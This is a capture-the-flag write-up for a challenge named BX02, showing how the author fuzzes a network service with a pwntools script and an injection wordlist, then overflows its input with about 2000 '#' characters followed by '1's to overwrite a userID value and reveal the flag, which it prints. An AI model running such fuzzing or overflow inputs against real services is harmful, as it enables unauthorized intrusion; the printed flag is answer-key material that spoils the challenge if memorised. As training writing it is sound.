# BX02
## BRIEFING
Access the network service at url: `cfta-bx02.allyourbases.co` port: `8013` and find a way to get the flag.

## Solution 

Upon initial connection to the target we get the following message:

```console
root@osboxes:~/Downloads/bx02# nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
```

If he hit enter we get a message saying that the input length was too large and the connection closes:

```console
root@osboxes:~/Downloads/bx02# nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms

DEBUG: Input length too large. 
```

Taking the hint, I went ahead and fuzzed the server. Kali has a handful of fuzzing scripts available in the `/usr/share/wordlists/wfuzz/` directory. I tried several of them and eventually had success with the `All_attack.txt` list.

The script I made for fuzzing is below:

```py
from pwn import *

HOST = 'cfta-bx02.allyourbases.co'
PORT = 8013

with open('/usr/share/wordlists/wfuzz/Injections/All_attack.txt') as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        sh = remote(HOST,PORT)
        sh.sendlineafter('Waiting 100ms\n',line)
        result = sh.recvline()
        if 'too large' not in result:
            print result
            print line
        sh.close()
```

And here is the output where I identified `#` as a valid character. 


```console
[+] Opening connection to cfta-bx02.allyourbases.co on port 8013: Done
[*] Closed connection to cfta-bx02.allyourbases.co port 8013
[+] Opening connection to cfta-bx02.allyourbases.co on port 8013: Done
[*] Closed connection to cfta-bx02.allyourbases.co port 8013
[+] Opening connection to cfta-bx02.allyourbases.co on port 8013: Done
DEBUG: Waiting 100ms

#
```

If we manually enter `#` we find that the connection stays open and re-prompts the `DEBUG: Waiting 100ms` message.

```console
root@osboxes:~/Downloads/bx02# nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
#
DEBUG: Waiting 100ms

```

At this point I decided to send a very large input consisting entirely of `#`'s. I started with 500 and got the following output:

```console
root@osboxes:~/Downloads/bx02# python -c 'print "#" * 500' | nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
```
At this point I wasn't sure if I was headed in the right correction, but I kept playing around and honing in the number of `#`'s. I did 1000 next and got even more `DEBUG: Waiting 100ms` messages. Eventually I went up to 2500 and got the following output:

```console
root@osboxes:~/Downloads/bx02# python -c 'print "#" * 2500' | nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Input length too large.
ERROR: Expected userID Variable of 1.
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
```

This looked promising and I began honing in on the number of `#`'s needed to get right up to the `ERROR: Expected userID Variable of 1.` message. It turned out that approximately 2000 `#`s were needed. Then, since the value of `1` was expected, I added 10 `1`'s to the end of 2000 `#`'s and this yielded the flag:

```console
root@osboxes:~/Downloads/bx02# python -c 'print "#" * 2000 + "1" * 10' | nc cfta-bx02.allyourbases.co 8013
Come Fuzz Me Bro.
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Waiting 100ms
DEBUG: Input length too large.

Flag: ThIsOneIsAbITFuZZy-6y
DEBUG: Waiting 100ms
```

The flag is **ThIsOneIsAbITFuZZy-6y**.
